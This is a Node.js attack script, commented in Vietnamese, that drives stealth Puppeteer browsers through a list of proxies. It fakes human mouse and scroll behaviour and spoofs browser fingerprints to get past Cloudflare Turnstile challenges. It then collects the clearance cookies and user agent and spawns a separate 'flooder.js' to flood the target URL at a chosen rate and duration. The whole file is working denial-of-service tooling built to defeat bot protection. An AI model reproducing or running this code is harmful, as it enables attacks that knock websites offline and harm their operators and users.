const errorHandler = error => {
  console.error("Error:", error.message || error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

Array.prototype.remove = function (item) {
  const index = this.indexOf(item);
  if (index !== -1) this.splice(index, 1);
  return item;
};

const async = require("async");
const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
puppeteer.use(puppeteerStealth());

// CLI arguments
const [,, targetURL, threads, proxiesCount, proxyFile, rates, duration] = process.argv;
function showUsageAndExit() {
  console.log(`Usage: node script.js <TargetURL> <Threads> <ProxyCount> <ProxyFile> <Rates> <Duration>`);
  process.exit(1);
}
if (!targetURL || isNaN(threads) || isNaN(proxiesCount) || !proxyFile || isNaN(rates) || isNaN(duration)) {
  showUsageAndExit();
}

// Utilities
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const { spawn } = require("child_process");
const readLines = path => fs.readFileSync(path, "utf8").split(/\r?\n/).filter(Boolean);
const randList = list => list[Math.floor(Math.random() * list.length)];
const proxies = readLines(proxyFile);
const colors = {
  COLOR_RED: "\x1b[31m",
  COLOR_GREEN: "\x1b[32m",
  COLOR_YELLOW: "\x1b[33m",
  COLOR_RESET: "\x1b[0m"
};
const colored = (colorCode, text) => console.log(`${colorCode}${text}${colors.COLOR_RESET}`);

// Validate proxy format (IP:PORT)
function validateProxy(proxy) {
  const proxyRegex = /^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})$/;
  return proxyRegex.test(proxy);
}

const validProxies = proxies.filter(proxy => validateProxy(proxy));
if (validProxies.length === 0) {
  colored(colors.COLOR_RED, "Error: No valid proxies found in proxyFile");
  process.exit(1);
}

// Giả lập hành vi người dùng
async function simulateHumanBehavior(page) {
  try {
    await page.evaluate(() => {
      const scrollAmount = Math.floor(Math.random() * 1000) + 300;
      window.scrollBy({ top: scrollAmount, behavior: "smooth" });
    });
    await sleep(Math.random() * 2000 + 1500);
    await page.mouse.move(Math.random() * 1200, Math.random() * 700, { steps: 20 });
    await sleep(Math.random() * 600 + 400);
    await page.mouse.click(Math.random() * 1200, Math.random() * 700);
    await sleep(Math.random() * 1000 + 500);
  } catch (e) {
    colored(colors.COLOR_YELLOW, `Behavior simulation failed: ${e.message}`);
  }
}

// Xử lý Cloudflare Challenge
async function bypassCloudflareChallenge(browserProxy, page) {
  try {
    const title = await page.title();
    const content = await page.content();

    if (title.includes("Attention Required! | Cloudflare") || content.includes("cf-error-code")) {
      throw new Error("Proxy blocked or rate-limited");
    }

    if (content.includes("Ôi") && content.includes("Lỗi. Thử lại nhé bạn")) {
      throw new Error("Cloudflare returned generic error: Ôi Lỗi. Thử lại nhé bạn.");
    }

    if (content.includes("challenge-platform") || content.includes("turnstile")) {
      colored(colors.COLOR_YELLOW, `HTTP-BROWSER | Detected Cloudflare challenge - ${browserProxy}`);

      const challengeElement = await Promise.race([
        page.waitForSelector("iframe[src*='challenges'], [id*='turnstile']", { timeout: 20000 }),
        page.waitForSelector("form#challenge-form", { timeout: 20000 })
      ]);

      if (!challengeElement) throw new Error("Challenge element not found");

      const turnstileFrame = await page.$("iframe[src*='challenges'], [id*='turnstile']");
      if (turnstileFrame) {
        const box = await turnstileFrame.boundingBox();
        if (!box) throw new Error("Turnstile frame not clickable");
        const x = box.x + Math.random() * box.width * 0.5 + 10;
        const y = box.y + Math.random() * box.height * 0.5 + 10;

        await page.mouse.move(x - 50, y - 50, { steps: 20 });
        await sleep(Math.random() * 400 + 300);
        await page.mouse.click(x, y);
        colored(colors.COLOR_YELLOW, `HTTP-BROWSER | Interacted with Turnstile - ${browserProxy}`);

        const token = await page.waitForFunction(
          () => document.querySelector("input[name='cf-turnstile-response']")?.value,
          { timeout: 40000 }
        ).then(() => page.evaluate(() => document.querySelector("input[name='cf-turnstile-response']")?.value));
        if (!token) throw new Error("Failed to retrieve cf-turnstile-response token");

        colored(colors.COLOR_GREEN, `HTTP-BROWSER | Turnstile token obtained: ${token.slice(0, 20)}... - ${browserProxy}`);
      } else {
        const challengeForm = await page.$("form#challenge-form");
        if (challengeForm) {
          await sleep(4000);
          await page.evaluate(() => document.querySelector("form#challenge-form")?.submit());
        }
      }

      await Promise.race([
        page.waitForNavigation({ waitUntil: "domcontentloaded", timeout: 40000 }),
        sleep(40000)
      ]);

      const newContent = await page.content();
      if (newContent.includes("challenge-platform") || newContent.includes("turnstile")) {
        throw new Error("Failed to bypass challenge");
      }
      if (newContent.includes("Ôi") && newContent.includes("Lỗi. Thử lại nhé bạn")) {
        throw new Error("Cloudflare returned generic error after challenge: Ôi Lỗi. Thử lại nhé bạn.");
      }
      colored(colors.COLOR_GREEN, `HTTP-BROWSER | Challenge bypassed successfully - ${browserProxy}`);
      return true;
    }

    colored(colors.COLOR_YELLOW, `HTTP-BROWSER | No challenge detected - ${browserProxy}`);
    return false;
  } catch (e) {
    throw new Error(`Challenge bypass failed: ${e.message}`);
  }
}

// Khởi chạy browser
async function openBrowser(targetURL, browserProxy) {
  const options = {
    headless: "new",
    ignoreHTTPSErrors: true,
    args: [
      `--proxy-server=http://${browserProxy}`,
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--ignore-certificate-errors",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      "--disable-infobars",
      "--window-size=1366,768",
      "--disable-features=IsolateOrigins,site-per-process",
      "--enable-webgl",
      "--enable-webrtc",
      `--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36`
    ],
  };

  let browser;
  try {
    browser = await puppeteer.launch(options);
    colored(colors.COLOR_YELLOW, `HTTP-BROWSER | Started browser - ${browserProxy}`);
    const [page] = await browser.pages();

    page.on("framenavigated", frame => {
      if (frame.url().includes("challenges.cloudflare.com")) {
        page._client().send("Target.detachFromTarget", { targetId: frame._id });
      }
    });

    await page.setDefaultNavigationTimeout(60000);
    await page.setViewport({ width: 1366, height: 768 });
    await page.setExtraHTTPHeaders({
      "Accept-Language": "en-US,en;q=0.9",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
      "DNT": "1",
    });

    await page.evaluateOnNewDocument(() => {
      Object.defineProperty(navigator, "webdriver", { get: () => false });
      window.navigator.chrome = { runtime: {} };
      Object.defineProperty(navigator, "plugins", { get: () => [1, 2, 3] });
      Object.defineProperty(navigator, "languages", { get: () => ["en-US", "en"] });
    });

    await page.goto(targetURL, { waitUntil: "domcontentloaded", timeout: 60000 });
    await simulateHumanBehavior(page);
    await bypassCloudflareChallenge(browserProxy, page);

    const title = await page.title();
    const cookies = await page.cookies(targetURL);
    const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join("; ").trim();
    const userAgent = await page.evaluate(() => navigator.userAgent);

    return { title, browserProxy, cookies: cookieString, userAgent };
  } catch (e) {
    throw new Error(`HTTP-BROWSER | Error: ${e.message} - ${browserProxy}`);
  } finally {
    if (browser) {
      colored(colors.COLOR_YELLOW, `HTTP-BROWSER | Closed browser - ${browserProxy}`);
      await browser.close();
    }
  }
}

// Quản lý thread
async function startThread(targetURL, browserProxy, task, done, retries = 0) {
  const MAX_RETRIES = 2;

  if (retries >= MAX_RETRIES) {
    const currentTask = queue.length();
    return done(null, { task, currentTask });
  }

  try {
    // Chỉ gọi flooder.js sau khi bypass CAPTCHA thành công
    const response = await openBrowser(targetURL, browserProxy);
    const cookies = `Title: ${response.title} | ${response.browserProxy} | ${response.userAgent} | ${response.cookies}`;
    colored(colors.COLOR_GREEN, `HTTP-BROWSER | CAPTCHA bypassed, starting flood - ${cookies}`);

    if (!fs.existsSync("flooder.js")) {
      throw new Error("flooder.js not found");
    }

    spawn("node", [
      "flooder.js",
      targetURL,
      duration,
      rates,
      "1",
      response.browserProxy,
      response.userAgent,
      response.cookies,
      "http"
    ], { stdio: "inherit" });

    done(null, { task, success: true });
  } catch (exception) {
    colored(colors.COLOR_RED, exception.message);
    await sleep(5000 * (retries + 1));
    await startThread(targetURL, browserProxy, task, done, retries + 1);
  }
}

// Task queue
const queue = async.queue((task, done) => {
  startThread(targetURL, task.browserProxy, task, done);
}, Number(threads));

// Main
async function __main__() {
  if (validProxies.length < proxiesCount) {
    colored(colors.COLOR_RED, `Error: Proxy count (${proxiesCount}) exceeds available proxies (${validProxies.length})`);
    process.exit(1);
  }

  for (let i = 0; i < proxiesCount; i++) {
    const browserProxy = randList(validProxies);
    validProxies.remove(browserProxy);
    queue.push({ browserProxy });
  }

  queue.drain(() => colored(colors.COLOR_GREEN, "All tasks completed."));
}

__main__().catch(errorHandler);